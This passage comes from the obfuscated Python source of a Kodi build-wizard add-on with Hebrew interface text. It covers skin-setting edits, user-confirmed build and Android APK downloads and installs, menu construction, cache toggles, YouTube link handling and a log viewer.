			OOOOO0OO0OO00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4264
			OOOOOO0OOO00OO00O =open (OOOOO0OO0OO00O00O ,'r')#line:4266
			OO0000OOOO00O00O0 =OOOOOO0OOO00OO00O .read ()#line:4267
			OOOOOO0OOO00OO00O .close ()#line:4268
			O00OO00OOO0OO00O0 ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4269
			O0000OO0OOOO00OOO =re .compile (O00OO00OOO0OO00O0 ).findall (OO0000OOOO00O00O0 )[0 ]#line:4270
			OOOOOO0OOO00OO00O =open (OOOOO0OO0OO00O00O ,'w')#line:4271
			OOOOOO0OOO00OO00O .write (OO0000OOOO00O00O0 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O0000OO0OOOO00OOO ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4272
			OOOOOO0OOO00OO00O .close ()#line:4273
			OOOOO0OO0OO00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4277
			OOOOOO0OOO00OO00O =open (OOOOO0OO0OO00O00O ,'r')#line:4279
			OO0000OOOO00O00O0 =OOOOOO0OOO00OO00O .read ()#line:4280
			OOOOOO0OOO00OO00O .close ()#line:4281
			O00OO00OOO0OO00O0 ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4282
			O0000OO0OOOO00OOO =re .compile (O00OO00OOO0OO00O0 ).findall (OO0000OOOO00O00O0 )[0 ]#line:4283
			OOOOOO0OOO00OO00O =open (OOOOO0OO0OO00O00O ,'w')#line:4284
			OOOOOO0OOO00OO00O .write (OO0000OOOO00O00O0 .replace ('<setting id="show.cdart" type="bool%s/setting>'%O0000OO0OOOO00OOO ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4285
			OOOOOO0OOO00OO00O .close ()#line:4286
			OOOOO0OO0OO00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4290
			OOOOOO0OOO00OO00O =open (OOOOO0OO0OO00O00O ,'r')#line:4292
			OO0000OOOO00O00O0 =OOOOOO0OOO00OO00O .read ()#line:4293
			OOOOOO0OOO00OO00O .close ()#line:4294
			O00OO00OOO0OO00O0 ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4295
			O0000OO0OOOO00OOO =re .compile (O00OO00OOO0OO00O0 ).findall (OO0000OOOO00O00O0 )[0 ]#line:4296
			OOOOOO0OOO00OO00O =open (OOOOO0OO0OO00O00O ,'w')#line:4297
			OOOOOO0OOO00OO00O .write (OO0000OOOO00O00O0 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O0000OO0OOOO00OOO ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4298
			OOOOOO0OOO00OO00O .close ()#line:4299
		except :#line:4304
			pass #line:4305
def thirdPartyInstall (OOOOO000OO000OO0O ,O0O00O00OO0O00O00 ):#line:4307
	if not wiz .workingURL (O0O00O00OO0O00O00 ):#line:4308
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4309
	OO000OOO0OO000000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOO000OO000OO0O ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4310
	if OO000OOO0OO000000 ==1 :#line:4311
		freshStart ('third',True )#line:4312
	wiz .clearS ('build')#line:4313
	OOOOO0O000O0O0000 =OOOOO000OO000OO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4314
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4315
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOO000OO000OO0O ),'','אנא המתן')#line:4316
	O0O0O0OO000000OO0 =os .path .join (PACKAGES ,'%s.zip'%OOOOO0O000O0O0000 )#line:4317
	try :os .remove (O0O0O0OO000000OO0 )#line:4318
	except :pass #line:4319
	downloader .download (O0O00O00OO0O00O00 ,O0O0O0OO000000OO0 ,DP )#line:4320
	xbmc .sleep (1000 )#line:4321
	O00O00OO000000O00 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOO000OO000OO0O )#line:4322
	DP .update (0 ,O00O00OO000000O00 ,'','אנא המתן')#line:4323
	O0000OOO0O000O000 ,OO00O00O0OOOOO0OO ,OO00O000O0000OOOO =extract .all (O0O0O0OO000000OO0 ,HOME ,DP ,title =O00O00OO000000O00 )#line:4324
	if int (float (O0000OOO0O000O000 ))>0 :#line:4325
		wiz .fixmetas ()#line:4326
		wiz .lookandFeelData ('save')#line:4327
		wiz .defaultSkin ()#line:4328
		wiz .setS ('installed','true')#line:4330
		wiz .setS ('extract',str (O0000OOO0O000O000 ))#line:4331
		wiz .setS ('errors',str (OO00O00O0OOOOO0OO ))#line:4332
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0000OOO0O000O000 ,OO00O00O0OOOOO0OO ))#line:4333
		try :os .remove (O0O0O0OO000000OO0 )#line:4334
		except :pass #line:4335
		if int (float (OO00O00O0OOOOO0OO ))>0 :#line:4336
			OO000O0O00OOO0O0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOO000OO000OO0O ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0000OOO0O000O000 ,'%',COLOR1 ,OO00O00O0OOOOO0OO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4337
			if OO000O0O00OOO0O0O :#line:4338
				if isinstance (OO00O00O0OOOOO0OO ,unicode ):#line:4339
					OO00O000O0000OOOO =OO00O000O0000OOOO .encode ('utf-8')#line:4340
				wiz .TextBox (ADDONTITLE ,OO00O000O0000OOOO )#line:4341
	DP .close ()#line:4342
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4343
	if INSTALLMETHOD ==1 :O0OO0O00O0OO00O0O =1 #line:4344
	elif INSTALLMETHOD ==2 :O0OO0O00O0OO00O0O =0 #line:4345
	else :O0OO0O00O0OO00O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4346
	if O0OO0O00O0OO00O0O ==1 :wiz .reloadFix ()#line:4347
	else :wiz .killxbmc (True )#line:4348
def testTheme (O0OOOO000OOOO0O00 ):#line:4350
	OO00OOOOOO00OO000 =zipfile .ZipFile (O0OOOO000OOOO0O00 )#line:4351
	for OOO0OOOOO0O000OOO in OO00OOOOOO00OO000 .infolist ():#line:4352
		if '/settings.xml'in OOO0OOOOO0O000OOO .filename :#line:4353
			return True #line:4354
	return False #line:4355
def testGui (O000O0000OO00O0OO ):#line:4357
	O000OOO0O00000OOO =zipfile .ZipFile (O000O0000OO00O0OO )#line:4358
	for O00O0OO00000O0OO0 in O000OOO0O00000OOO .infolist ():#line:4359
		if '/guisettings.xml'in O00O0OO00000O0OO0 .filename :#line:4360
			return True #line:4361
	return False #line:4362
def apkInstaller (O0OOO0O0000O000OO ,O0O000O00OO00OO00 ):#line:4364
	wiz .log (O0OOO0O0000O000OO )#line:4365
	wiz .log (O0O000O00OO00OO00 )#line:4366
	if wiz .platform ()=='android':#line:4367
		OO00000000O0OO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOO0O0000O000OO ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4368
		if not OO00000000O0OO0OO :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4369
		O0OOO00O0O0O000O0 =O0OOO0O0000O000OO #line:4370
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4371
		if not wiz .workingURL (O0O000O00OO00OO00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4372
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO00O0O0O000O0 ),'','אנא המתן')#line:4373
		O000O00OO0OO0O0OO =os .path .join (PACKAGES ,"%s.apk"%O0OOO0O0000O000OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4374
		try :os .remove (O000O00OO0OO0O0OO )#line:4375
		except :pass #line:4376
		downloader .download (O0O000O00OO00OO00 ,O000O00OO0OO0O0OO ,DP )#line:4377
		xbmc .sleep (100 )#line:4378
		DP .close ()#line:4379
		notify .apkInstaller (O0OOO0O0000O000OO )#line:4380
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O000O00OO0OO0O0OO +'")')#line:4381
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4382
def createMenu (OOOO0O000000OO000 ,OO0OO0OO0O0O0O00O ,OO00O0OOOOO0000O0 ):#line:4388
	if OOOO0O000000OO000 =='saveaddon':#line:4389
		OO0O0OOO000OO000O =[]#line:4390
		O0OO0OOOOOO00OO0O =urllib .quote_plus (OO0OO0OO0O0O0O00O .lower ().replace (' ',''))#line:4391
		O0OOO000O0O000O0O =OO0OO0OO0O0O0O00O .replace ('Debrid','Real Debrid')#line:4392
		O0OO0O000OOOO00O0 =urllib .quote_plus (OO00O0OOOOO0000O0 .lower ().replace (' ',''))#line:4393
		OO00O0OOOOO0000O0 =OO00O0OOOOO0000O0 .replace ('url','URL Resolver')#line:4394
		OO0O0OOO000OO000O .append ((THEME2 %OO00O0OOOOO0000O0 .title (),' '))#line:4395
		OO0O0OOO000OO000O .append ((THEME3 %'Save %s Data'%O0OOO000O0O000O0O ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0OO0OOOOOO00OO0O ,O0OO0O000OOOO00O0 )))#line:4396
		OO0O0OOO000OO000O .append ((THEME3 %'Restore %s Data'%O0OOO000O0O000O0O ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0OO0OOOOOO00OO0O ,O0OO0O000OOOO00O0 )))#line:4397
		OO0O0OOO000OO000O .append ((THEME3 %'Clear %s Data'%O0OOO000O0O000O0O ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O0OO0OOOOOO00OO0O ,O0OO0O000OOOO00O0 )))#line:4398
	elif OOOO0O000000OO000 =='save':#line:4399
		OO0O0OOO000OO000O =[]#line:4400
		O0OO0OOOOOO00OO0O =urllib .quote_plus (OO0OO0OO0O0O0O00O .lower ().replace (' ',''))#line:4401
		O0OOO000O0O000O0O =OO0OO0OO0O0O0O00O .replace ('Debrid','Real Debrid')#line:4402
		O0OO0O000OOOO00O0 =urllib .quote_plus (OO00O0OOOOO0000O0 .lower ().replace (' ',''))#line:4403
		OO00O0OOOOO0000O0 =OO00O0OOOOO0000O0 .replace ('url','URL Resolver')#line:4404
		OO0O0OOO000OO000O .append ((THEME2 %OO00O0OOOOO0000O0 .title (),' '))#line:4405
		OO0O0OOO000OO000O .append ((THEME3 %'Register %s'%O0OOO000O0O000O0O ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O0OO0OOOOOO00OO0O ,O0OO0O000OOOO00O0 )))#line:4406
		OO0O0OOO000OO000O .append ((THEME3 %'Save %s Data'%O0OOO000O0O000O0O ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0OO0OOOOOO00OO0O ,O0OO0O000OOOO00O0 )))#line:4407
		OO0O0OOO000OO000O .append ((THEME3 %'Restore %s Data'%O0OOO000O0O000O0O ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0OO0OOOOOO00OO0O ,O0OO0O000OOOO00O0 )))#line:4408
		OO0O0OOO000OO000O .append ((THEME3 %'Import %s Data'%O0OOO000O0O000O0O ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O0OO0OOOOOO00OO0O ,O0OO0O000OOOO00O0 )))#line:4409
		OO0O0OOO000OO000O .append ((THEME3 %'Clear Addon %s Data'%O0OOO000O0O000O0O ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O0OO0OOOOOO00OO0O ,O0OO0O000OOOO00O0 )))#line:4410
	elif OOOO0O000000OO000 =='install':#line:4411
		OO0O0OOO000OO000O =[]#line:4412
		O0OO0O000OOOO00O0 =urllib .quote_plus (OO00O0OOOOO0000O0 )#line:4413
		OO0O0OOO000OO000O .append ((THEME2 %OO00O0OOOOO0000O0 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O0OO0O000OOOO00O0 )))#line:4414
		OO0O0OOO000OO000O .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O0OO0O000OOOO00O0 )))#line:4415
		OO0O0OOO000OO000O .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O0OO0O000OOOO00O0 )))#line:4416
		OO0O0OOO000OO000O .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O0OO0O000OOOO00O0 )))#line:4417
		OO0O0OOO000OO000O .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O0OO0O000OOOO00O0 )))#line:4418
	OO0O0OOO000OO000O .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4419
	return OO0O0OOO000OO000O #line:4420
def toggleCache (O0000O0O0O0OOO00O ):#line:4422
	OO0O0OOOO00OO0000 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4423
	O00O0O0O0OO000O0O =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4424
	if O0000O0O0O0OOO00O in ['true','false']:#line:4425
		for OO00O000O0O00000O in OO0O0OOOO00OO0000 :#line:4426
			wiz .setS (OO00O000O0O00000O ,O0000O0O0O0OOO00O )#line:4427
	else :#line:4428
		if not O0000O0O0O0OOO00O in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4429
			try :#line:4430
				OO00O000O0O00000O =O00O0O0O0OO000O0O [OO0O0OOOO00OO0000 .index (O0000O0O0O0OOO00O )]#line:4431
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OO00O000O0O00000O ))#line:4432
			except :#line:4433
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O0000O0O0O0OOO00O ))#line:4434
		else :#line:4435
			OO0OOO00O0OOOO0OO ='true'if wiz .getS (O0000O0O0O0OOO00O )=='false'else 'false'#line:4436
			wiz .setS (O0000O0O0O0OOO00O ,OO0OOO00O0OOOO0OO )#line:4437
def playVideo (O000O0OOO00O0O0OO ):#line:4439
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O000O0OOO00O0O0OO )#line:4440
	if 'watch?v='in O000O0OOO00O0O0OO :#line:4441
		O00O0OO0OO0O0OO00 ,OOOO00O0OOO0O0OO0 =O000O0OOO00O0O0OO .split ('?')#line:4442
		OO0OO00000OOOOOOO =OOOO00O0OOO0O0OO0 .split ('&')#line:4443
		for OOOOOO0O000000000 in OO0OO00000OOOOOOO :#line:4444
			if OOOOOO0O000000000 .startswith ('v='):#line:4445
				O000O0OOO00O0O0OO =OOOOOO0O000000000 [2 :]#line:4446
				break #line:4447
			else :continue #line:4448
	elif 'embed'in O000O0OOO00O0O0OO or 'youtu.be'in O000O0OOO00O0O0OO :#line:4449
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O000O0OOO00O0O0OO )#line:4450
		O00O0OO0OO0O0OO00 =O000O0OOO00O0O0OO .split ('/')#line:4451
		if len (O00O0OO0OO0O0OO00 [-1 ])>5 :#line:4452
			O000O0OOO00O0O0OO =O00O0OO0OO0O0OO00 [-1 ]#line:4453
		elif len (O00O0OO0OO0O0OO00 [-2 ])>5 :#line:4454
			O000O0OOO00O0O0OO =O00O0OO0OO0O0OO00 [-2 ]#line:4455
	wiz .log ("YouTube URL: %s"%O000O0OOO00O0O0OO )#line:4456
	yt .PlayVideo (O000O0OOO00O0O0OO )#line:4457
def viewLogFile ():#line:4459
	OO0O00O00OOO000O0 =wiz .Grab_Log (True )#line:4460
	O00O00OO00O00OOOO =wiz .Grab_Log (True ,True )#line:4461
	O00OO00OOO0000O0O =0 ;OOO000OOO0OOOO00O =OO0O00O00OOO000O0 #line:4462
	if not O00O00OO00O00OOOO ==False and not OO0O00O00OOO000O0 ==False :#line:4463
		O00OO00OOO0000O0O =DIALOG .select (ADDONTITLE ,["View %s"%OO0O00O00OOO000O0 .replace (LOG ,""),"View %s"%O00O00OO00O00OOOO .replace (LOG ,"")])#line:4464
		if O00OO00OOO0000O0O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4465
	elif OO0O00O00OOO000O0 ==False and O00O00OO00O00OOOO ==False :#line:4466
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4467
		return #line:4468
	elif not OO0O00O00OOO000O0 ==False :O00OO00OOO0000O0O =0 #line:4469
	elif not O00O00OO00O00OOOO ==False :O00OO00OOO0000O0O =1 #line:4470
	OOO000OOO0OOOO00O =OO0O00O00OOO000O0 if O00OO00OOO0000O0O ==0 else O00O00OO00O00OOOO #line:4472
	OO00000OO0OO00OOO =wiz .Grab_Log (False )if O00OO00OOO0000O0O ==0 else wiz .Grab_Log (False ,True )#line:4473
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OOO000OOO0OOOO00O ),OO00000OO0OO00OOO )#line:4475
def errorChecking (log =None ,count =None ,all =None ):#line:4477
	if log ==None :#line:4478
		O0O0000OOO0O0000O =wiz .Grab_Log (True )#line:4479
		OOO0OO0O00O0OOO0O =wiz .Grab_Log (True ,True )#line:4480
		if not OOO0OO0O00O0OOO0O ==False and not O0O0000OOO0O0000O ==False :#line:4481
			OOO0O0O0OO000O000 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O0O0000OOO0O0000O .replace (LOG ,""),errorChecking (O0O0000OOO0O0000O ,True ,True )),"View %s: %s error(s)"%(OOO0OO0O00O0OOO0O .replace (LOG ,""),errorChecking (OOO0OO0O00O0OOO0O ,True ,True ))])#line:4482
			if OOO0O0O0OO000O000 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4483
		elif O0O0000OOO0O0000O ==False and OOO0OO0O00O0OOO0O ==False :#line:4484
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4485
			return #line:4486
		elif not O0O0000OOO0O0000O ==False :OOO0O0O0OO000O000 =0 #line:4487
		elif not OOO0OO0O00O0OOO0O ==False :OOO0O0O0OO000O000 =1 #line:4488
		log =O0O0000OOO0O0000O if OOO0O0O0OO000O000 ==0 else OOO0OO0O00O0OOO0O #line:4489
	if log ==False :#line:4490
		if count ==None :#line:4491
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4492
			return False #line:4493
		else :#line:4494
			return 0 #line:4495
	else :#line:4496
		if os .path .exists (log ):#line:4497
			OO0O0OO00O000OO0O =open (log ,mode ='r');OOO0OO0O0O0OOOOOO =OO0O0OO00O000OO0O .read ().replace ('\n','').replace ('\r','');OO0O0OO00O000OO0O .close ()#line:4498
			OOOO0O0OOOO00OOO0 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OOO0OO0O0O0OOOOOO )#line:4499
			if not count ==None :#line:4500
				if all ==None :#line:4501
					OO00OOOO000O00O00 =0 #line:4502
					for O00OOOO00O0OO0O0O in OOOO0O0OOOO00OOO0 :#line:4503
						if ADDON_ID in O00OOOO00O0OO0O0O :OO00OOOO000O00O00 +=1 #line:4504
					return OO00OOOO000O00O00 #line:4505
				else :return len (OOOO0O0OOOO00OOO0 )#line:4506
			if len (OOOO0O0OOOO00OOO0 )>0 :#line:4507
				OO00OOOO000O00O00 =0 ;OOOOO0O0OO00O0O0O =""#line:4508
				for O00OOOO00O0OO0O0O in OOOO0O0OOOO00OOO0 :#line:4509
					if all ==None and not ADDON_ID in O00OOOO00O0OO0O0O :continue #line:4510
					else :#line:4511
						OO00OOOO000O00O00 +=1 #line:4512
						OOOOO0O0OO00O0O0O +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OO00OOOO000O00O00 ,O00OOOO00O0OO0O0O .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4513
				if OO00OOOO000O00O00 >0 :#line:4514
					wiz .TextBox (ADDONTITLE ,OOOOO0O0OO00O0O0O )#line:4515
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4516
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4517
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4518
ACTION_PREVIOUS_MENU =10 #line:4520
ACTION_NAV_BACK =92 #line:4521
ACTION_MOVE_LEFT =1 #line:4522
ACTION_MOVE_RIGHT =2 #line:4523
ACTION_MOVE_UP =3 #line:4524
ACTION_MOVE_DOWN =4 #line:4525
ACTION_MOUSE_WHEEL_UP =104 #line:4526
ACTION_MOUSE_WHEEL_DOWN =105 #line:4527
ACTION_MOVE_MOUSE =107 #line:4528
ACTION_SELECT_ITEM =7 #line:4529
ACTION_BACKSPACE =110 #line:4530
ACTION_MOUSE_LEFT_CLICK =100 #line:4531
ACTION_MOUSE_LONG_CLICK =108 #line:4532
def LogViewer (default =None ):#line:4534
	class O0000O000O00OOOO0 (xbmcgui .WindowXMLDialog ):#line:4535
		def __init__ (OOOO00OOOOOO00O00 ,*O0OOO00O000O0OO0O ,**O0OO0O0O0O00O0OOO ):#line:4536
			OOOO00OOOOOO00O00 .default =O0OO0O0O0O00O0OOO ['default']#line:4537
		def onInit (O000O00O0OO0OOOO0 ):#line:4539
			O000O00O0OO0OOOO0 .title =101 #line:4540
			O000O00O0OO0OOOO0 .msg =102 #line:4541
			O000O00O0OO0OOOO0 .scrollbar =103 #line:4542
			O000O00O0OO0OOOO0 .upload =201 #line:4543
			O000O00O0OO0OOOO0 .kodi =202 #line:4544
			O000O00O0OO0OOOO0 .kodiold =203 #line:4545
			O000O00O0OO0OOOO0 .wizard =204 #line:4546
			O000O00O0OO0OOOO0 .okbutton =205 #line:4547
			OOOOOOO00O000O0OO =open (O000O00O0OO0OOOO0 .default ,'r')#line:4548
			O000O00O0OO0OOOO0 .logmsg =OOOOOOO00O000O0OO .read ()#line:4549
			OOOOOOO00O000O0OO .close ()#line:4550
			O000O00O0OO0OOOO0 .titlemsg ="%s: %s"%(ADDONTITLE ,O000O00O0OO0OOOO0 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4551
			O000O00O0OO0OOOO0 .showdialog ()#line:4552
		def showdialog (OO0O0O0O0000O00OO ):#line:4554
			OO0O0O0O0000O00OO .getControl (OO0O0O0O0000O00OO .title ).setLabel (OO0O0O0O0000O00OO .titlemsg )#line:4555
			OO0O0O0O0000O00OO .getControl (OO0O0O0O0000O00OO .msg ).setText (wiz .highlightText (OO0O0O0O0000O00OO .logmsg ))#line:4556
			OO0O0O0O0000O00OO .setFocusId (OO0O0O0O0000O00OO .scrollbar )#line:4557
		def onClick (OO0OO00OOOO0000OO ,O0OOO0OOO00OO0O0O ):#line:4559
			if O0OOO0OOO00OO0O0O ==OO0OO00OOOO0000OO .okbutton :OO0OO00OOOO0000OO .close ()#line:4560
			elif O0OOO0OOO00OO0O0O ==OO0OO00OOOO0000OO .upload :OO0OO00OOOO0000OO .close ();uploadLog .Main ()#line:4561
			elif O0OOO0OOO00OO0O0O ==OO0OO00OOOO0000OO .kodi :#line:4562
				OO0O00O00000OO0O0 =wiz .Grab_Log (False )#line:4563
				O0OO0OOO000O0O00O =wiz .Grab_Log (True )#line:4564
				if OO0O00O00000OO0O0 ==False :#line:4565
					OO0OO00OOOO0000OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4566
					OO0OO00OOOO0000OO .getControl (OO0OO00OOOO0000OO .msg ).setText ("Log File Does Not Exists!")#line:4567
				else :#line:4568
					OO0OO00OOOO0000OO .titlemsg ="%s: %s"%(ADDONTITLE ,O0OO0OOO000O0O00O .replace (LOG ,''))#line:4569
					OO0OO00OOOO0000OO .getControl (OO0OO00OOOO0000OO .title ).setLabel (OO0OO00OOOO0000OO .titlemsg )#line:4570
					OO0OO00OOOO0000OO .getControl (OO0OO00OOOO0000OO .msg ).setText (wiz .highlightText (OO0O00O00000OO0O0 ))#line:4571
					OO0OO00OOOO0000OO .setFocusId (OO0OO00OOOO0000OO .scrollbar )#line:4572
			elif O0OOO0OOO00OO0O0O ==OO0OO00OOOO0000OO .kodiold :#line:4573
				OO0O00O00000OO0O0 =wiz .Grab_Log (False ,True )#line:4574
				O0OO0OOO000O0O00O =wiz .Grab_Log (True ,True )#line:4575
				if OO0O00O00000OO0O0 ==False :#line:4576
					OO0OO00OOOO0000OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4577
					OO0OO00OOOO0000OO .getControl (OO0OO00OOOO0000OO .msg ).setText ("Log File Does Not Exists!")#line:4578
				else :#line:4579
					OO0OO00OOOO0000OO .titlemsg ="%s: %s"%(ADDONTITLE ,O0OO0OOO000O0O00O .replace (LOG ,''))#line:4580
					OO0OO00OOOO0000OO .getControl (OO0OO00OOOO0000OO .title ).setLabel (OO0OO00OOOO0000OO .titlemsg )#line:4581
					OO0OO00OOOO0000OO .getControl (OO0OO00OOOO0000OO .msg ).setText (wiz .highlightText (OO0O00O00000OO0O0 ))#line:4582
					OO0OO00OOOO0000OO .setFocusId (OO0OO00OOOO0000OO .scrollbar )#line:4583
			elif O0OOO0OOO00OO0O0O ==OO0OO00OOOO0000OO .wizard :#line:4584
				OO0O00O00000OO0O0 =wiz .Grab_Log (False ,False ,True )#line:4585
				O0OO0OOO000O0O00O =wiz .Grab_Log (True ,False ,True )#line:4586
				if OO0O00O00000OO0O0 ==False :#line:4587
					OO0OO00OOOO0000OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4588
					OO0OO00OOOO0000OO .getControl (OO0OO00OOOO0000OO .msg ).setText ("Log File Does Not Exists!")#line:4589
				else :#line:4590
					OO0OO00OOOO0000OO .titlemsg ="%s: %s"%(ADDONTITLE ,O0OO0OOO000O0O00O .replace (ADDONDATA ,''))#line:4591
					OO0OO00OOOO0000OO .getControl (OO0OO00OOOO0000OO .title ).setLabel (OO0OO00OOOO0000OO .titlemsg )#line:4592
					OO0OO00OOOO0000OO .getControl (OO0OO00OOOO0000OO .msg ).setText (wiz .highlightText (OO0O00O00000OO0O0 ))#line:4593
					OO0OO00OOOO0000OO .setFocusId (OO0OO00OOOO0000OO .scrollbar )#line:4594
		def onAction (O0O0O0O00OO0O0OOO ,O00OOO00O000O0O00 ):#line:4596
			if O00OOO00O000O0O00 ==ACTION_PREVIOUS_MENU :O0O0O0O00OO0O0OOO .close ()#line:4597
			elif O00OOO00O000O0O00 ==ACTION_NAV_BACK :O0O0O0O00OO0O0OOO .close ()#line:4598
